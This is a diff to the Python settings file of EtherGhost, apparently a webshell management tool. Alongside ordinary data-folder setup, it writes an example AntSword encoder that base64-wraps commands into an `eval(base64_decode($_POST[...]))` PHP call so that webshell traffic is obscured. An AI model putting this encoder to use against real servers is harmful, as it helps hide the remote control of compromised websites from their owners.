@@ -6,6 +6,7 @@ SETTINGS_VERSION = "0.0.1"
 DB_FILENAME = "store.db"
 
 # 当前操作系统的数据保存位置
+# TODO: 允许用户自定义
 if os.name == "posix":
     DATA_FOLDER = Path("~/.local/share/EtherGhost").expanduser()
 elif os.name == "nt":
@@ -19,6 +20,20 @@ DATA_FOLDER.mkdir(parents=True, exist_ok=True)
 
 ANTSWORD_ENCODER_FOLDER = DATA_FOLDER / "AntSwordEncoder"
 
-ANTSWORD_ENCODER_FOLDER.mkdir(exist_ok=True)
+if not ANTSWORD_ENCODER_FOLDER.exists():
+    ANTSWORD_ENCODER_FOLDER.mkdir()
+
+    (ANTSWORD_ENCODER_FOLDER / "example-base64.js").write_text(
+        """
+module.exports = (pwd, data, ext={}) => {
+    let randomID = `_0x${Math.random().toString(16).substr(2)}`;
+    data[randomID] = Buffer.from(data['_']).toString('base64');
+    data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
+    delete data['_'];
+    return data;
+}
+"""
+    )
+
 
 STORE_URL = "sqlite:///" + (DATA_FOLDER / DB_FILENAME).as_posix()
